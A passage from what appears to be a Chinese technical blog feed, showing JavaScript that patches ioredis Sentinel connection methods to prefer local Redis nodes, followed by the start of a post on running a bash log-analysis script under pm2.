<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.connector.resolveSlave = resolveSlavePreferLocal;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">true</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'redis client('</span> + JSON.stringify({name: client.options.name<span style="text-decoration: underline;">, db: client.options.db, sentinels: client.options.sentinels}) + </span><span style="color: #8abeb7; text-decoration: underline;">') status unexpected'</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
}
</pre>
</div>

<p>
用法如下
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">options</span> = {name: <span style="color: #8abeb7;">"data"</span>, sentinels: sentinels, db: 0, role: <span style="color: #8abeb7;">"slave"</span>, lazyCon<span style="text-decoration: underline;">nect: </span><span style="color: #81a2be; text-decoration: underline;">true</span><span style="text-decoration: underline;">}</span>
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>(options);
<span style="color: #b5bd68;">if</span> (preferLocalSlave(client)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">"prefer local slave on redis sentinel("</span> + JSON.stringify(option<span style="text-decoration: underline;">s) + </span><span style="color: #8abeb7; text-decoration: underline;">")"</span><span style="text-decoration: underline;">);</span>
}
</pre>
</div>

<p>
值得注意的是必须指定 <code>lazyConnect: true</code> ，这样才能通过替换 client 中的方法实现功能。 
</p>
</div>
</div>

<div id="outline-container-orgb21678a" class="outline-2">
<h2 id="orgb21678a">在 &lt;2.4.0 的 ioredis 上实现优先选择本地结点</h2>
<div class="outline-text-2" id="text-orgb21678a">
<p>
假设 redis 是以 1 Master + 1 Slave 方式进行跨机房部署，那么我们希望实现优先连接本地结点（忽略其角色），
连接成功后该连接可能是 Master 也可能是 Slave，我们把它当 Slave 用准没错。
</p>

<p>
preferredSlaves 选项已经在 2.4.0 版实现，下面的代码依赖之前的 ioredis 版本代码，仅供参考，不建议使用。
</p>

<p>
实现逻辑：
</p>

<ul class="org-ul">
<li>按上一节的实现获取 slave</li>
</ul>


<ul class="org-ul">
<li>如果 slave 在本地，则使用该 slave，否则尝试连接 master</li>
</ul>


<ul class="org-ul">
<li>如果 master 在本地，则使用该 master，否则使用前面的 slave。</li>
</ul>


<p>
具体实现如下
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* A SentinelConnector.prototype.resolveMaster replacement, indicate the resolve</span><span style="color: #b294bb; text-decoration: underline;">d node is local node.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param client redis client.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param callback function (err, master) called when done.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*                 master with a extra boolean field "local_node" to indicate ma</span><span style="color: #b294bb; text-decoration: underline;">ster is in local network.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">resolveMasterPreferLocal</span> (<span style="color: #f0c674;">client</span>, <span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.sentinel(<span style="color: #8abeb7;">'get-master-addr-by-name'</span>, <span style="color: #81a2be;">this</span>.options.name, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>,<span style="text-decoration: underline;"> </span><span style="color: #f0c674; text-decoration: underline;">result</span><span style="text-decoration: underline;">) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.disconnect();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(err);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">localIP</span> = client.stream.localAddress;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.disconnect();

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">localIPSegments</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Array</span>(4);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (net.isIPv4(localIP)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   localIPSegments = localIP.split(<span style="color: #8abeb7;">'.'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">local_node</span> = <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (Array.isArray(result)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">ip</span> = result[0];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (net.isIPv4(ip)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">ipSegments</span> = ip.split(<span style="color: #8abeb7;">'.'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (localIPSegments[0] === ipSegments[0] &amp;&amp;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   localIPSegments[1] === ipSegments[1] &amp;&amp;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   localIPSegments[2] === ipSegments[2]) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   local_node = <span style="color: #81a2be;">true</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   callback(<span style="color: #81a2be;">null</span>, Array.isArray(result) ? { host: result[0], port: result[1<span style="text-decoration: underline;">], local_node: local_node } : </span><span style="color: #81a2be; text-decoration: underline;">null</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
};

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* A SentinelConnector.prototype.resolve replacement, prefer resolve to local no</span><span style="color: #b294bb; text-decoration: underline;">de.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param endpoint sentinel endpoint to connect.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param callback function (err, node) called when done.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*                 node with a extra boolean field "local_node" to indicate node</span><span style="color: #b294bb; text-decoration: underline;"> is in local network.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">resolvePreferLocal</span>(<span style="color: #f0c674;">endpoint</span>, <span style="color: #f0c674;">callback</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   assert(<span style="color: #81a2be;">this</span>.options.role === <span style="color: #8abeb7;">'slave'</span>);

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>({
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   port: endpoint.port,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   host: endpoint.host,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   retryStrategy: <span style="color: #81a2be;">null</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   enableReadyCheck: <span style="color: #81a2be;">false</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   connectTimeout: <span style="color: #81a2be;">this</span>.options.connectTimeout
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">self</span> = <span style="color: #81a2be;">this</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">this</span>.resolveSlave(client, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">slave_err</span>, <span style="color: #f0c674;">slave</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (slave_err || !slave ||!slave.local_node) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (slave_err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(<span style="color: #8abeb7;">'redis('</span> + JSON.stringify({name: self.options.name<span style="text-decoration: underline;">, db: self.options.db, sentinels: self.options.sentinels}) + </span><span style="color: #8abeb7; text-decoration: underline;">') resolve slave error('</span><span style="text-decoration: underline;"> + slave_err.toString() + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>({
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   port: endpoint.port,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   host: endpoint.host,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   retryStrategy: <span style="color: #81a2be;">null</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   enableReadyCheck: <span style="color: #81a2be;">false</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   connectTimeout: self.options.connectTimeout
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> self.resolveMaster(client, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">master_err</span>, <span style="color: #f0c674;">master</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (master_err) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.error(<span style="color: #8abeb7;">'redis('</span> + JSON.stringify({name: self.options.<span style="text-decoration: underline;">name, db: self.options.db, sentinels: self.options.sentinels}) + </span><span style="color: #8abeb7; text-decoration: underline;">') resolve master error('</span><span style="text-decoration: underline;"> + master_err.toString() + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (!master_err &amp;&amp; master &amp;&amp; master.local_node) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'redis('</span> + JSON.stringify({name: self.options.n<span style="text-decoration: underline;">ame, db: self.options.db, sentinels: self.options.sentinels}) + </span><span style="color: #8abeb7; text-decoration: underline;">') resolve slave to local master: '</span><span style="text-decoration: underline;"> + master.host + </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> + master.port);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">null</span>, master);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span> (slave || master) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">null</span>, slave || master);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(slave_err || master_err, <span style="color: #81a2be;">null</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> callback(<span style="color: #81a2be;">null</span>, slave);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   });
}

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* A SentinelConnector.prototype.check replacement, enable connect local master </span><span style="color: #b294bb; text-decoration: underline;">when connect to slave.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">checkPreferLocal</span>(<span style="color: #f0c674;">info</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">true</span>;
}

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* Prefer connect to local redis node, slave first.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @param client redis client.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* @return is this change successful.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">preferLocal</span>(<span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (client.options.role === <span style="color: #8abeb7;">'slave'</span> &amp;&amp; client.connector.resolveSlave) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (client.options.lazyConnect &amp;&amp; client.status == <span style="color: #8abeb7;">'wait'</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (client.connector.resolveSlave != resolveSlavePreferLocal) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   preferLocalSlave(client);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.connector.resolveMaster = resolveMasterPreferLocal;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.connector.resolve = resolvePreferLocal;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.connector.check = checkPreferLocal;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">true</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">'redis client('</span> + JSON.stringify({name: client.options.name<span style="text-decoration: underline;">, db: client.options.db, sentinels: client.options.sentinels}) + </span><span style="color: #8abeb7; text-decoration: underline;">') status unexpected'</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
}
</pre>
</div>

<p>
用法如下
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">options</span> = {name: <span style="color: #8abeb7;">"data"</span>, sentinels: sentinels, db: 0, role: <span style="color: #8abeb7;">"slave"</span>, lazyCon<span style="text-decoration: underline;">nect: </span><span style="color: #81a2be; text-decoration: underline;">true</span><span style="text-decoration: underline;">}</span>
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Redis</span>(options);
<span style="color: #b5bd68;">if</span> (preferLocal(client)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.warn(<span style="color: #8abeb7;">"prefer local on redis sentinel("</span> + JSON.stringify(options) + <span style="color: #8abeb7;">"</span><span style="color: #8abeb7; text-decoration: underline;">)"</span><span style="text-decoration: underline;">);</span>
}
</pre>
</div>
</div>
</div>

<div id="outline-container-org77eee99" class="outline-2">
<h2 id="org77eee99">在 2.4.x 的 ioredis 上实现优先选择本地结点（使用 preferredSlaves）</h2>
<div class="outline-text-2" id="text-org77eee99">
<p>
具体实现以及用法请参考 gist <a href="https://gist.github.com/tangxinfa/3361a11acf2270e8388b43bfcb25ce0e">Connect redis with Minimum Distance First(MDF) algorithm</a> ，使用 preferredSlaves 选项实现，要求 ioredis 版本至少为 2.4.0 。在 ioredis 上做了一层封装，使用 ioredis 的方式需要改变，没有侵入 ioredis 的代码。
</p>

<p>
实现逻辑如下：
</p>

<ul class="org-ul">
<li>使用 preferredSlaves 优先连接本地 slave</li>
</ul>


<ul class="org-ul">
<li>如果 slave 在本地，则使用该 slave 连接；否则尝试连接 master</li>
</ul>


<ul class="org-ul">
<li>如果 master 在本地，则使用该 master 连接，否则使用前面的 slave 连接。</li>
</ul>


<p>
这导致当本地无 slave 而连上本地 master 后，总是重连 master。
</p>
</div>
</div>

<div id="outline-container-org26959c0" class="outline-2">
<h2 id="org26959c0">在 2.4.x 的 ioredis 上实现优先选择本地结点（不使用 preferredSlaves）</h2>
<div class="outline-text-2" id="text-org26959c0">
<p>
具体实现以及用法请参考 github 仓库 <a href="https://github.com/tangxinfa/ioredis_sentinel_connector">https://github.com/tangxinfa/ioredis_sentinel_connector</a> ，要求 ioredis 版本为 2.4.x。
</p>


<p>
通过替换 SentinelConnector.prototype.resolveSlave 及 SentinelConnector.prototype.check 方法实现，主要的实现逻辑：
</p>

<ul class="org-ul">
<li>优先连接本地 slave</li>
</ul>


<ul class="org-ul">
<li>如果 slave 在本地，则使用该 slave 连接；否则尝试连接 master</li>
</ul>


<ul class="org-ul">
<li>如果 master 在本地，则使用该 master 连接，否则使用前面的 slave 连接。</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 pm2 启动 bash 后台脚本]]></title>
            <link>/article/4f7f7528-pm2-542f52a8-bash-540e53f0811a672c.html</link>
            <guid>/article/4f7f7528-pm2-542f52a8-bash-540e53f0811a672c.html</guid>
            <pubDate>Fri, 02 Sep 2016 02:28:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
我们常常会使用 bash 写一些后台运行的守护进程，然后使用 crontab 实现开机启动并监控，
也可以改为使用 pm2 来运行，功能更强大，更简单规范。
</p>

<p>
使用 pm2 来管理后台进程仍然可以获得其大部分功能，如：
</p>

<ul class="org-ul">
<li>日志管理</li>
</ul>


<ul class="org-ul">
<li>监控</li>
</ul>


<ul class="org-ul">
<li>进程管理</li>
</ul>


<ul class="org-ul">
<li>开机启动</li>
</ul>


<ul class="org-ul">
<li>崩溃重启</li>
</ul>


<p>
如下定义 process.json
</p>

<div class="org-src-container">
<pre class="src src-json">{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> apps : [{
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   name      : <span style="color: #8abeb7;">"run-log-analyze"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   script    : <span style="color: #8abeb7;">"./tools/run-log-analyze.sh"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   env: {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   },
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   merge_logs: <span style="color: #81a2be;">true</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   error_file: <span style="color: #8abeb7;">"tools/run-log-analyze.log"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   out_file: <span style="color: #8abeb7;">"tools/run-log-analyze.log"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   exec_mode: <span style="color: #8abeb7;">"fork"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> }]
}
</pre>
</div>

<p>
run-log-analyze.sh 用于实时分析应用的日志
</p>

<div class="org-src-container">
<pre class="src src-sh">tail -f ./run.log | bunyan --strict -c <span style="color: #8abeb7;">'this.msg == "file uploaded"'</span> -0 | json -<span style="text-decoration: underline;">ga file | ./tools/file-scan -o ./tools/file-scan-successed.log -e ./tools/file-scan-failed.log</span>
</pre>
</div>

<p>
